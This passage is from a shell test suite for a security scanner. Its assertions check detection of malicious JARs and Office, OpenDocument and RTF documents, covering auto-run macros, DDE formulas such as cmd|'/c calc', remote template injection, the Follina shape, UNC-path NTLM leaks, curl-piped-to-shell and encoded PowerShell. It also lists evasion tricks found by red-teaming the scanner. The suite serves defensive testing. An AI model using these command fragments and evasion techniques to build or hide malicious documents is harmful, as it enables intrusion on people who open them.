        assert_not_contains "$JSAFE" "docs/keys.txt" \
            "prose that follows a PEM header (words, not a base64 body) is not a key"

        JHV=$(line_for jar_hostile_variants.jar)
        assert_contains "$JHV" "v/long_url.txt" "curl … | sh with a 250-character URL is found"
        assert_contains "$JHV" "v/continued.txt" "curl … \\<newline> | sh is found"
        assert_contains "$JHV" "v/abs_sh.txt" "… | /bin/sh is found"
        assert_contains "$JHV" "v/env_bash.txt" "… | /usr/bin/env bash is found"
        assert_contains "$JHV" "v/ps_flags.txt" "powershell with twenty flags before -enc is found"

        assert_contains "$(line_for jar_pe_late.jar)" "res/logo.png" \
            "a PE whose header lies past the first 4 KB is flagged"
        JFAT=$(line_for jar_fat_macho.jar)
        assert_contains "$JFAT" "res/icon.gif" \
            "a fat Mach-O (0xCAFEBABE + architecture count) stored as icon.gif is flagged"
        assert_contains "$JFAT" "CWE-506:jar_class_entry_is_not_bytecode(1: com/x/Fat.class" \
            "a fat Mach-O named .class is not bytecode (a class has major version 45 or more)"
        assert_contains "$(line_for jar_class_attribute.jar)" "CWE-78:jar_embeds_download_piped_to_shell" \
            "a payload in a class file's attribute area, outside the constant pool, is found"

        # Benign shapes. Each of these failed a first-cut rule.
        assert_not_contains "$(line_for jar_macosx.jar)" "[FAIL]" \
            "does NOT fail an AppleDouble ._Name.class resource fork under __MACOSX"
        assert_not_contains "$(line_for jar_waitforit.jar)" "[FAIL]" \
            "does NOT fail wait-for-it.sh (a /dev/tcp port probe is not a reverse shell)"
        JNH=$(line_for jar_native_helpers.jar)
        assert_not_contains "$JNH" "[FAIL]" \
            "does NOT fail an extensionless native helper, a .pyd or a .o"
        assert_contains "$JNH" "jar:bundles_native_library" \
            "…they are reported as native libraries"

        # gradle-wrapper.jar runs on ./gradlew before any code the repository
        # declares. Its shape is checked; its contents cannot be: the official
        # checksums are not embedded here.
        assert_contains "$(line_for wrapper_good/gradle-wrapper.jar)" "jar:wrapper_checksum_must_be_verified" \
            "a structurally normal gradle-wrapper.jar still asks for a checksum check"
        assert_not_contains "$(line_for wrapper_good/gradle-wrapper.jar)" "[FAIL]" \
            "a structurally normal gradle-wrapper.jar does not fail"
        assert_contains "$(line_for wrapper_evil/gradle-wrapper.jar)" "CWE-494:wrapper_jar_has_unexpected_content" \
            "a gradle-wrapper.jar carrying classes outside org/gradle is flagged"
        assert_contains "$(line_for wrapper_evil/gradle-wrapper.jar)" "install.sh" \
            "the finding names the stray entry"
        assert_contains "$(line_for wrapper_hollow/gradle-wrapper.jar)" "missing org/gradle/wrapper/GradleWrapperMain.class" \
            "a gradle-wrapper.jar without GradleWrapperMain is flagged"
        assert_contains "$(line_for wrapper_multirelease/gradle-wrapper.jar)" "CWE-494:wrapper_jar_has_unexpected_content" \
            "a wrapper hiding a Multi-Release copy of its main class under META-INF/versions is flagged"
        assert_contains "$(line_for wrapper_maven/maven-wrapper.jar)" "jar:wrapper_checksum_must_be_verified" \
            "maven-wrapper.jar is held to the same shape check"

        # ── Office documents ─────────────────────────────────────────────────
        # Before scan_office a .docx, .xlsx, .odt, .rtf or .doc had no handler and was
        # recorded PASS, whatever it held. An office document is a container: OOXML and
        # OpenDocument are ZIPs of XML, the legacy .doc/.xls/.ppt are OLE2 compound
        # files, and a VBA macro is a compressed module inside a nested one. What
        # matters is what runs when the file is OPENED (macros, DDE, an external
        # template or object fetched from a remote host) and what the file smuggles
        # (an embedded executable, an Equation Editor object). Calibration: 123 real
        # OpenDocument templates and the python-docx / python-pptx defaults on this
        # host, plus documents LibreOffice converted to every format; recall rests on
        # fixtures, because none of these has a macro or a remote link.
        for _safe in office_safe.docx office_safe.xlsx office_safe.pptx office_safe.odt office_safe.rtf \
                     office_legacy_plain.doc office_big.docx; do
            assert_not_contains "$(line_for "$_safe")" "[FAIL]" \
                "does NOT fail an ordinary document: ${_safe}"
            assert_not_contains "$(line_for "$_safe")" "[WARN]" \
                "…and does not warn about it either: ${_safe}"
        done
        # .dot is Graphviz, .pot is gettext and a .doc can be plain text: all three are
        # routed here by extension and must fall back to the unknown-file path, not fail.
        for _amb in office_graphviz.dot office_gettext.pot office_plain.doc; do
            assert_not_contains "$(line_for "$_amb")" "[FAIL]" \
                "text with an office-looking extension is not an office document and does not fail: ${_amb}"
            assert_not_contains "$(line_for "$_amb")" "[WARN]" \
                "…nor warn: ${_amb}"
        done

        # External relationships
        assert_contains "$(line_for office_remote_template.docx)" "CWE-829:office_remote_template_injection" \
            "an attachedTemplate pointing at http:// is flagged (remote template injection)"
        assert_contains "$(line_for office_follina.docx)" "CWE-829:office_object_or_frame_fetched_from_a_remote_host" \
            "an oleObject relationship to http://…html! is flagged (the Follina shape)"
        assert_contains "$(line_for office_uri_handler.docx)" "CWE-94:office_link_uses_a_script_or_diagnostic_uri_scheme" \
            "a hyperlink with an ms-msdt: target is flagged"
        assert_contains "$(line_for office_unc_image.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "an image fetched from \\\\host\\share is flagged (NTLM leak)"
        assert_contains "$(line_for office_unc_hyperlink.docx)" "office:hyperlink_to_a_unc_path" \
            "a hyperlink to a file share is reported"
        assert_not_contains "$(line_for office_unc_hyperlink.docx)" "[FAIL]" \
            "…but not blocked: enterprise documents link to shares"
        assert_contains "$(line_for office_remote_image.docx)" "office:remote_image_or_content_fetched_when_opened" \
            "an image fetched from http:// is reported (tracking pixel)"
        assert_not_contains "$(line_for office_remote_image.docx)" "[FAIL]" \
            "…but not blocked"

        # DDE
        assert_contains "$(line_for office_dde.docx)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "a DDEAUTO field split across runs is flagged (the fragments are joined)"
        assert_contains "$(line_for office_dde_formula.xlsx)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "a cmd|'/c calc'!A0 cell formula is flagged"
        assert_contains "$(line_for office_dde_link.xlsx)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "an Excel ddeLink to cmd is flagged"

        # Macros
        JMD=$(line_for office_macro_dangerous.docm)
        assert_contains "$JMD" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a Word macro that auto-runs and starts PowerShell is flagged"
        assert_contains "$JMD" "AutoOpen" \
            "…and the finding names the auto-run procedure"
        assert_contains "$(line_for office_macro_evil.xlsm)" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "an Excel macro with URLDownloadToFile and Shell is flagged"
        JMB=$(line_for office_macro_benign.xlsm)
        assert_contains "$JMB" "office:contains_vba_macro" \
            "a macro-enabled workbook with a harmless macro is reported"
        assert_not_contains "$JMB" "[FAIL]" \
            "…and is not blocked: a macro that only writes cells does not start anything"
        JMX=$(line_for office_macro_ext.docx)
        assert_contains "$JMX" "office:vba_macro_in_a_non_macro_extension" \
            "a vbaProject.bin inside a .docx is reported as a disguised macro file"
        assert_contains "$JMX" "office:contains_vba_macro" \
            "…as a macro file too"
        JXL=$(line_for office_xlm.xlsm)
        assert_contains "$JXL" "CWE-94:office_excel4_macro_sheet_is_hidden_or_runs_programs" \
            "a veryHidden Excel 4.0 macro sheet running EXEC is flagged"

        # Embedded objects
        assert_contains "$(line_for office_embedded_exe.docx)" "CWE-506:office_embeds_an_executable_or_script" \
            "an OLE Package holding invoice.exe is flagged"
        assert_contains "$(line_for office_embedded_script.docx)" "CWE-506:office_embeds_an_executable_or_script" \
            "an embedded .js is flagged"
        JEN=$(line_for office_embedded_nested.docx)
        assert_contains "$JEN" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a macro inside a workbook embedded in the document is found (nested one level)"
        assert_contains "$JEN" "Microsoft_Excel_Worksheet.xlsx!" \
            "…and the finding says where it was"
        assert_contains "$(line_for office_embedded_object.docx)" "office:contains_embedded_object" \
            "an ordinary embedded OLE object is reported"
        assert_not_contains "$(line_for office_embedded_object.docx)" "[FAIL]" \
            "…but not blocked"
        assert_contains "$(line_for office_activex.docx)" "office:contains_activex_control" \
            "an ActiveX control is reported"
        assert_contains "$(line_for office_altchunk.docx)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "an Equation object inside an alternate-format RTF chunk is found"
        assert_contains "$(line_for office_altchunk.docx)" "office:contains_alternate_format_chunk" \
            "…and the chunk itself is reported"

        # Container shape
        assert_contains "$(line_for office_xxe.docx)" "CWE-611:office_part_declares_an_external_entity" \
            "a part with an external ENTITY is flagged (XXE for whatever parses it next)"
        assert_contains "$(line_for office_doctype.docx)" "office:xml_part_has_a_doctype" \
            "a bare DOCTYPE in an Office part is reported"
        assert_not_contains "$(line_for office_doctype.docx)" "[FAIL]" \
            "…but not blocked"
        assert_contains "$(line_for office_zipslip.docx)" "CWE-22:office_part_path_traversal_zip_slip" \
            "a part named ../../… is flagged as zip-slip"
        assert_contains "$(line_for office_elf.docx)" "CWE-506:office_file_is_a_native_executable_despite_its_extension" \
            "an ELF binary named .docx is flagged"
        assert_contains "$(line_for office_text.docx)" "office:not_an_office_document_despite_its_extension" \
            "plain text named .docx is reported"
        assert_not_contains "$(line_for office_text.docx)" "[FAIL]" \
            "…but not blocked"
        assert_contains "$(line_for office_not_ooxml.docx)" "office:not_an_office_document_despite_its_extension" \
            "a ZIP with no Office structure named .docx is reported"
        assert_contains "$(line_for office_truncated.docx)" "office:container_could_not_be_parsed" \
            "a truncated .docx is reported as not inspected"
        assert_contains "$(line_for office_empty.docx)" "office:empty_file" \
            "a zero-byte .docx is reported"
        assert_contains "$(line_for office_encrypted.docx)" "office:encrypted_content_not_inspected" \
            "a password-protected .docx is reported as not inspected"

        # OpenDocument
        JOM=$(line_for office_odf_macro.odt)
        assert_contains "$JOM" "CWE-94:odf_macro_runs_on_open" \
            "an embedded macro bound to office:load is flagged"
        assert_contains "$JOM" "CWE-94:odf_macro_runs_programs_or_downloads" \
            "…and its Shell() call is flagged"
        assert_contains "$(line_for office_odf_macro_benign.ods)" "odf:contains_macro" \
            "an embedded StarBasic macro that only shows a message is reported"
        assert_not_contains "$(line_for office_odf_macro_benign.ods)" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_odf_python.odt)" "CWE-94:odf_macro_runs_programs_or_downloads" \
            "an embedded Python script calling os.system is flagged"
        assert_contains "$(line_for office_odf_dde.ods)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "an ODF DDE link to cmd is flagged"
        assert_contains "$(line_for office_odf_flat_dde.fods)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "a flat .fods with a DDE link to powershell is flagged"
        assert_contains "$(line_for office_odf_unc.odt)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "an ODF image fetched from a UNC path is flagged"
        assert_contains "$(line_for office_odf_remote.odt)" "odf:external_resource_linked" \
            "an ODF image fetched from http:// is reported"
        assert_not_contains "$(line_for office_odf_remote.odt)" "[FAIL]" \
            "…but not blocked"
        assert_contains "$(line_for office_odf_encrypted.odt)" "office:encrypted_content_not_inspected" \
            "an encrypted ODF document is reported as not inspected"

        # RTF
        assert_contains "$(line_for office_rtf_equation.rtf)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "an RTF Equation.3 object carrying a command is flagged"
        assert_contains "$(line_for office_rtf_obfuscated.rtf)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "the same object with line breaks and empty groups inside the hex is still flagged"
        assert_contains "$(line_for office_rtf_autolink.rtf)" "CWE-829:rtf_linked_object_updates_from_a_remote_source" \
            "an RTF \\objautlink + \\objupdate object is flagged"
        assert_contains "$(line_for office_rtf_template.rtf)" "CWE-829:office_remote_template_injection" \
            "an RTF \\template pointing at http:// is flagged"
        assert_contains "$(line_for office_rtf_package.rtf)" "CWE-506:office_embeds_an_executable_or_script" \
            "an RTF Package object holding invoice.exe is flagged"
        assert_contains "$(line_for office_rtf_dde.rtf)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "an RTF DDEAUTO field is flagged"
        assert_contains "$(line_for office_rtf_object.rtf)" "rtf:contains_embedded_ole_object" \
            "an ordinary embedded OLE object in an RTF is reported"
        assert_not_contains "$(line_for office_rtf_object.rtf)" "[FAIL]" \
            "…but not blocked"

        # Legacy binary (OLE2)
        JLM=$(line_for office_legacy_macro.doc)
        assert_contains "$JLM" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a .doc whose macro auto-runs and starts PowerShell is flagged"
        assert_contains "$JLM" "AutoOpen" \
            "…and the finding names the auto-run procedure"
        assert_contains "$(line_for office_legacy_macro_benign.xls)" "office:contains_vba_macro" \
            "a .xls with a harmless macro is reported"
        assert_not_contains "$(line_for office_legacy_macro_benign.xls)" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_legacy_equation.doc)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "an Equation Editor object with a command in its stream is flagged"
        assert_contains "$(line_for office_legacy_equation_benign.doc)" "office:equation_editor_object" \
            "an Equation Editor object without a payload is reported"
        assert_not_contains "$(line_for office_legacy_equation_benign.doc)" "[FAIL]" \
            "…and is not blocked: old scientific documents contain them"
        assert_contains "$(line_for office_legacy_package.doc)" "CWE-506:office_embeds_an_executable_or_script" \
            "a .doc whose OLE Package holds invoice.exe is flagged"
        assert_contains "$(line_for office_legacy_objpool.doc)" "office:contains_embedded_object" \
            "a .doc with an ordinary embedded object is reported"
        assert_contains "$(line_for office_legacy_xlm.xls)" "CWE-94:office_excel4_macro_sheet_is_hidden_or_runs_programs" \
            "a .xls with a hidden Excel 4.0 macro sheet is flagged"
        assert_contains "$(line_for office_legacy_dde.doc)" "CWE-94:office_dde_field_or_formula_starts_a_program" \
            "a .doc with a DDEAUTO field is flagged"
        assert_contains "$(line_for office_legacy_truncated.doc)" "office:container_could_not_be_parsed" \
            "a truncated .doc is reported as not inspected"

        # Ways round the rules
        JGT=$(line_for office_gt_attr.docx)
        assert_contains "$JGT" "CWE-829:office_object_or_frame_fetched_from_a_remote_host" \
            "a '>' inside a quoted attribute value does not hide the Type and Target that follow"
        assert_contains "$JGT" "CWE-829:office_remote_template_injection" \
            "single-quoted attributes are read like double-quoted ones"
        JSM=$(line_for office_severity_marker.docx)
        assert_contains "$JSM" "[FAIL] CWE-522:office_references_a_unc_path_ntlm_leak" \
            "a :LOW: inside a relationship target does not downgrade the FAIL"
        assert_not_contains "$JSM" "LOW_SEV" \
            "…and the message carries no severity marker taken from the document"
        assert_contains "$(line_for office_hidden_exe.docx)" "CWE-506:office_embeds_an_executable_or_script" \
            "a Windows executable stored as word/media/image1.png is flagged"
        assert_contains "$(line_for office_pem.docx)" "CWE-321:hardcoded_private_key" \
            "a PEM private key pasted into a document, one paragraph per line, is flagged"
        JXV=$(line_for office_xlm_visible.xlsm)
        assert_contains "$JXV" "office:excel4_macro_sheet" \
            "a visible Excel 4.0 macro sheet that calls nothing dangerous is reported"
        assert_not_contains "$JXV" "[FAIL]" \
            "…and is not blocked"
        JVG=$(line_for office_vba_garbage.docm)
        assert_contains "$JVG" "office:vba_project_could_not_be_read" \
            "a VBA project whose source cannot be read is reported as not inspected"
        assert_contains "$JVG" "office:contains_vba_macro" \
            "…and still counts as a macro"
        assert_contains "$(line_for office_nested_deep.docx)" "office:inspection_incomplete" \
            "a macro four documents deep is not opened, and the document says so"
        assert_contains "$(line_for office_unreadable.docx)" "office:parts_could_not_be_read" \
            "a part stored with an unsupported compression method is reported"
        assert_contains "$(line_for office_odf_link_macro.odt)" "odf:contains_macro" \
            "an ODF hyperlink that runs a document macro on click is reported"
        assert_not_contains "$(line_for office_odf_link_macro.odt)" "[FAIL]" \
            "…and is not blocked: that needs a click"
        assert_contains "$(line_for office_odf_dde_benign.ods)" "office:dde_connection_declared" \
            "an ODF DDE link to an ordinary program is reported"
        assert_not_contains "$(line_for office_odf_dde_benign.ods)" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$JMB" "office:vba_macro_runs_when_the_document_opens" \
            "a macro with a Workbook_Open procedure says it runs when the document opens"
        assert_contains "$(line_for office_odf_python.odt)" "CWE-78:office_macro_or_script_pipes_a_download_into_a_shell" \
            "curl | sh inside an ODF script is flagged by the hostile-string rule"
        assert_contains "$(line_for office_vba_corrupt_dir.docm)" "CWE-94:office_vba_macro_runs_programs_or_downloads" \
            "a VBA project with an unreadable dir stream is still read: the source is found by its signature"
        assert_contains "$(line_for office_xlm_hidden_quiet.xlsm)" "CWE-94:office_excel4_macro_sheet_is_hidden_or_runs_programs" \
            "a hidden Excel 4.0 macro sheet is flagged even when it calls nothing"
        JOH=$(line_for office_odf_hostile.odt)
        assert_contains "$JOH" "CWE-78:office_macro_or_script_runs_encoded_powershell" \
            "powershell -enc inside an ODF script is flagged"
        assert_contains "$JOH" "CWE-494:office_macro_or_script_downloads_with_certutil_or_bitsadmin" \
            "certutil -urlcache inside an ODF script is flagged"
        assert_not_contains "$(line_for office_safe_template_link.odt)" "[WARN]" \
            "a meta:template link to a local file (every document made from a template has one) is not reported"

        # Found by reviewing the rules
        JPP=$(line_for office_pptx_program.pptx)
        assert_contains "$JPP" "CWE-78:office_presentation_action_runs_a_program" \
            "a PowerPoint ppaction://program hyperlink is flagged"
        assert_contains "$JPP" "office:hyperlink_targets_a_program" \
            "…and the hyperlink that points at cmd.exe is reported"
        assert_contains "$(line_for office_pptx_macro_action.pptx)" "office:presentation_action_runs_a_macro" \
            "a ppaction://macro action is reported"
        assert_not_contains "$(line_for office_pptx_macro_action.pptx)" "[FAIL]" \
            "…and is not blocked"
        JFI=$(line_for office_field_include.docx)
        assert_contains "$JFI" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "an INCLUDEPICTURE field fetching from a UNC path is flagged"
        assert_contains "$JFI" "office:remote_image_or_content_fetched_when_opened" \
            "an INCLUDETEXT field fetching from http:// is reported"
        assert_contains "$(line_for office_smb.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "a smb:// target is treated as a network share"
        assert_contains "$(line_for office_cifs.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "a cifs:// target is treated as a network share"
        assert_contains "$(line_for office_file4.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "file://// (four slashes, a UNC path) is treated as a network share"
        assert_contains "$(line_for office_webquery.xlsx)" "office:remote_image_or_content_fetched_when_opened" \
            "an Excel web query to http:// is reported"
        assert_not_contains "$(line_for office_webquery.xlsx)" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_webquery_unc.xlsx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "an Excel web query to a UNC path is flagged"
        assert_not_contains "$(line_for office_webquery_safe.xlsx)" "office:" \
            "a workbook whose connection is a local database query is not reported"

        # Found by red-teaming the scanner: each of these evaded it until it was fixed
        XLM_MSG="CWE-94:office_excel4_macro_sheet_is_hidden_or_runs_programs"
        DDE_MSG="CWE-94:office_dde_field_or_formula_starts_a_program"
        assert_contains "$(line_for office_rt_prefix_dde.docx)" "$DDE_MSG" \
            "a Word field written with the prefix x: instead of w: is still found (a prefix is arbitrary)"
        assert_contains "$(line_for office_rt_prefix_formula.xlsx)" "$DDE_MSG" \
            "a DDE cell formula in x:f elements is still found"
        assert_contains "$(line_for office_rt_prefix_listener.odt)" "CWE-94:odf_macro_runs_on_open" \
            "an ODF event listener written with another prefix is still flagged"
        assert_contains "$(line_for office_rt_prefix_rels.docx)" "CWE-829:office_remote_template_injection" \
            "a relationships part with a prefixed namespace is still read"
        assert_contains "$(line_for office_rt_moved_main.docx)" "$DDE_MSG" \
            "a main part moved to doc/main.dat (named by _rels/.rels and [Content_Types].xml) is still inspected"
        assert_contains "$(line_for office_rt_moved_macrosheet.xlsm)" "CWE-94:office_excel4_macro_sheet_is_hidden_or_runs_programs" \
            "an Excel 4.0 macro sheet moved to xl/ms/sheet2.xml (named by the workbook relationship) is still found"
        assert_contains "$(line_for office_rt_utf16_rels.docx)" "CWE-829:office_remote_template_injection" \
            "a UTF-16 relationships part is decoded, not read as mojibake"
        assert_contains "$(line_for office_rt_utf16_document.docx)" "$DDE_MSG" \
            "a UTF-16 main part is decoded"
        assert_contains "$(line_for office_rt_cdata_dde.docx)" "$DDE_MSG" \
            "a field instruction held in CDATA is read"
        assert_contains "$(line_for office_rt_comment_dde.docx)" "$DDE_MSG" \
            "a comment inside a field instruction does not split DDEAUTO"
        assert_contains "$(line_for office_rt_xxe_padded.docx)" "CWE-611:office_part_declares_an_external_entity" \
            "an external entity whose SYSTEM keyword is 2600 spaces after ENTITY is flagged"
        assert_contains "$(line_for office_rt_xxe_after_many.docx)" "CWE-611:office_part_declares_an_external_entity" \
            "an external entity behind 400 harmless ones is flagged"
        assert_contains "$(line_for office_rt_ole2link.rtf)" "CWE-829:rtf_linked_object_updates_from_a_remote_source" \
            "a CVE-2017-0199 OLE2Link object (UTF-16 URL in the moniker) is flagged"
        JOL=$(line_for office_rt_ole2link_local.rtf)
        assert_contains "$JOL" "rtf:contains_embedded_ole_object" \
            "an OLE2Link object that points at a local file is reported"
        assert_not_contains "$JOL" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_rt_ole2link.doc)" "CWE-829:office_object_or_frame_fetched_from_a_remote_host" \
            "a URL moniker inside a legacy .doc object is flagged"
        VBA_MSG="CWE-94:office_vba_macro_runs_programs_or_downloads"
        assert_contains "$(line_for office_rt_vba_declare_shell.docm)" "$VBA_MSG" \
            "VirtualAlloc/CreateThread declared before Lib \"kernel32\" (with a continuation line) is a shellcode loader"
        assert_contains "$(line_for office_rt_vba_declare_alias.docm)" "$VBA_MSG" \
            "…and so is a declaration that renames VirtualAlloc through Alias"
        JVB=$(line_for office_rt_vba_declare_benign.docm)
        assert_not_contains "$JVB" "[FAIL]" \
            "GetTickCount and CopyMemory declarations alone do not block a macro"
        assert_contains "$JVB" "office:vba_macro_runs_when_the_document_opens" \
            "…but its AutoOpen is still reported"
        assert_contains "$(line_for office_rt_flat_opc.docx)" "$DDE_MSG" \
            "a Flat OPC package (one XML file) with a DDE field is read"
        assert_contains "$(line_for office_rt_flat_opc_macro.docx)" "$VBA_MSG" \
            "a VBA project carried as base64 binaryData in a Flat OPC package is found"
        assert_contains "$(line_for office_rt_wordml2003.doc)" "$DDE_MSG" \
            "a Word 2003 XML document named .doc is read"
        assert_contains "$(line_for office_rt_plain_xml.docx)" "office:not_an_office_document_despite_its_extension" \
            "an unrelated XML file named .docx is still only reported"
        assert_contains "$(line_for office_rt_attr_collision_last.docx)" "CWE-829:office_remote_template_injection" \
            "Type followed by x:Type: the unprefixed Type is not hidden by the attribute that shares its local name"
        assert_contains "$(line_for office_rt_attr_collision_first.docx)" "CWE-829:office_remote_template_injection" \
            "x:Type followed by Type: the same, in the other order"
        assert_contains "$(line_for office_rt_utf16le_nobom_rels.docx)" "CWE-829:office_remote_template_injection" \
            "UTF-16LE without a byte-order mark is recognised from the shape of the first '<'"
        assert_contains "$(line_for office_rt_utf16be_rels.docx)" "CWE-829:office_remote_template_injection" \
            "UTF-16BE with a byte-order mark is decoded"
        assert_contains "$(line_for office_rt_macrosheet_ctype_only.xlsm)" "$XLM_MSG" \
            "a macro sheet named only by its content type is found"
        assert_contains "$(line_for office_rt_macrosheet_rel_only.xlsm)" "$XLM_MSG" \
            "a macro sheet named only by the workbook relationship is found"
        assert_contains "$(line_for office_rt_macrosheet_dotdot.xlsm)" "$XLM_MSG" \
            "a relationship target with .. is resolved against the source part's folder"
        assert_contains "$(line_for office_rt_macrosheet_absolute.xlsm)" "$XLM_MSG" \
            "an absolute relationship target (/data/sheet2.xml) is resolved from the package root"
        assert_contains "$(line_for office_rt_vba_ctype_only.docx)" "$VBA_MSG" \
            "a VBA project named only by its content type is read, whatever its file name"
        assert_contains "$(line_for office_rt_vba_rel_only.docx)" "$VBA_MSG" \
            "a VBA project named only by the relationship that points at it is read"
        assert_contains "$(line_for office_rt_embedded_elsewhere.docx)" "CWE-506:office_embeds_an_executable_or_script" \
            "an OLE package outside word/embeddings/, named by its oleObject relationship, is opened"
        MACRO_EXT="office:vba_macro_in_a_non_macro_extension"
        assert_contains "$(line_for office_rt_vba_ctype_only.docx)" "$MACRO_EXT" \
            "…and is recognised as a macro project (a .docx carrying one is reported)"
        assert_contains "$(line_for office_rt_vba_rel_only.docx)" "$MACRO_EXT" \
            "…likewise when only the relationship names it"
        assert_contains "$(line_for office_rt_vba_default_ctype.docx)" "$MACRO_EXT" \
            "…and when the content type comes from a Default extension entry"
        assert_contains "$(line_for office_rt_embedded_pkg_elsewhere.docx)" "$VBA_MSG" \
            "an embedded package that is not an OLE file, named only by its package relationship, is opened"
        assert_contains "$(line_for office_rt_ole_unnamed.docx)" "$VBA_MSG" \
            "an OLE compound file stored under an unrelated name is recognised by its magic and opened"
        assert_contains "$(line_for office_rt_vba_default_ctype.docx)" "$VBA_MSG" \
            "a VBA project whose content type comes from a Default extension entry is read"
        assert_contains "$(line_for office_rt_delinstr.docx)" "$DDE_MSG" \
            "a tracked-deleted field instruction (it returns when the change is rejected) is read"
        # Second round of red-teaming (an agent per format family; real LibreOffice used as the oracle for the ODF events)
        assert_contains "$(line_for office_rt2_unicode_prefix_dde.docx)" "$DDE_MSG" \
            "a namespace prefix that starts with a non-ASCII letter (é:) is still read"
        assert_contains "$(line_for office_rt2_unicode_prefix_rels.docx)" "CWE-829:office_remote_template_injection" \
            "…and so is one holding U+00B7, which an XML name allows"
        assert_contains "$(line_for office_rt2_cref_targetmode.docx)" "CWE-829:office_remote_template_injection" \
            "TargetMode=\"Ext&#101;rnal\": a character reference in an attribute value is decoded, as a parser decodes it"
        assert_contains "$(line_for office_rt2_cref_fldchar.docx)" "$DDE_MSG" \
            "fldCharType=\"b&#101;gin\" still opens the field whose instruction is split across runs"
        assert_contains "$(line_for office_rt2_cref_hidden.xlsm)" "$XLM_MSG" \
            "state=\"&#104;idden\" on a macro sheet is still a hidden macro sheet"
        assert_contains "$(line_for office_rt2_include_switch.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "INCLUDEPICTURE with a switch before the file name: the UNC target is still found"
        assert_contains "$(line_for office_rt2_link_class.docx)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "LINK takes a class name first; the file name after it is still found"
        assert_not_contains "$(line_for office_rt2_include_local.docx)" "office:" \
            "INCLUDEPICTURE with a switch and a local file name is not reported"
        ODFMSG="CWE-94:odf_macro_runs_on_open"
        assert_contains "$(line_for office_rt2_odf_mimetype_late.odt)" "$ODFMSG" \
            "an ODF package whose mimetype entry is not among the first four is still an ODF package"
        assert_contains "$(line_for office_rt2_odf_no_mimetype.odt)" "$ODFMSG" \
            "…and so is one with no mimetype entry at all (the manifest says what it is)"
        assert_contains "$(line_for office_rt2_odf_domfocusin.odt)" "$ODFMSG" \
            "dom:DOMFocusIn runs a document macro when LibreOffice opens the document"
        assert_contains "$(line_for office_rt2_odf_layout_finished.odt)" "$ODFMSG" \
            "office:layout-finished runs a document macro when a text document opens"
        assert_contains "$(line_for office_rt2_odf_page_count_change.odt)" "$ODFMSG" \
            "office:page-count-change does too"
        JMC=$(line_for office_rt2_odf_modify_changed.odt)
        assert_contains "$JMC" "odf:contains_macro" \
            "office:modify-changed (not fired on open) is reported"
        assert_not_contains "$JMC" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_rt2_xlm_auto_close.xls)" "$XLM_MSG" \
            "a legacy macro sheet with Auto_Close and a command line is not just 'a visible macro sheet'"
        assert_contains "$(line_for office_rt2_xlm_cmd_only.xls)" "$XLM_MSG" \
            "a legacy macro sheet whose strings hold a command line is flagged without any Auto_ name"
        assert_contains "$(line_for office_rt2_xlm_autoclose_only.xls)" "$XLM_MSG" \
            "a legacy macro sheet with an Auto_Close name is flagged without any command line"
        assert_contains "$(line_for office_rt2_equation_compobj_only.doc)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "an Equation object recognised only by its CompObj text is searched for a payload in all of its streams"
        JXQ=$(line_for office_rt2_xlm_visible_quiet.xls)
        assert_contains "$JXQ" "office:excel4_macro_sheet" \
            "a visible legacy macro sheet that runs nothing is reported"
        assert_not_contains "$JXQ" "[FAIL]" \
            "…and is not blocked"
        assert_contains "$(line_for office_rt2_equation_renamed_stream.doc)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "an Equation object recognised by its CLSID is searched for a payload in any of its streams"
        assert_contains "$(line_for office_rt2_ole_moniker_padded.doc)" "CWE-829:office_object_or_frame_fetched_from_a_remote_host" \
            "a URL moniker in an Ole stream padded past 64 KB is still found"
        assert_contains "$(line_for office_rt2_rtf_dde_additive.rtf)" "$DDE_MSG" \
            "a no-op RTF control word before DDEAUTO does not hide the field"
        assert_contains "$(line_for office_rt2_rtf_dde_hexescape.rtf)" "$DDE_MSG" \
            "a hex escape (apostrophe 44) inside the keyword is decoded"
        assert_contains "$(line_for office_rt2_rtf_template_additive.rtf)" "CWE-829:office_remote_template_injection" \
            "a no-op control word before a remote template target does not hide it"
        assert_contains "$(line_for office_rt2_rtf_includepicture.rtf)" "CWE-522:office_references_a_unc_path_ntlm_leak" \
            "an INCLUDEPICTURE field in an RTF is checked like one in a .docx"
        assert_contains "$(line_for office_rt2_rtf_bin_brace_equation.rtf)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "a raw closing brace carried by a bin control word inside objdata is data and does not end the object"
        assert_contains "$(line_for office_rt2_rtf_bin_braces_equation.rtf)" "CWE-94:office_equation_editor_object_carries_a_payload" \
            "two raw closing braces carried by one bin control word do not end the object group"
        assert_contains "$(line_for office_rt2_rtf_bin_unc.rtf)" "CWE-829:rtf_linked_object_updates_from_a_remote_source" \
            "raw backslashes carried by a bin control word are part of the UNC target"
        assert_contains "$(line_for office_rt2_rtf_bin_brace_pe.rtf)" "CWE-506:office_embeds_an_executable_or_script" \
            "…for an OLE Package holding an .exe"
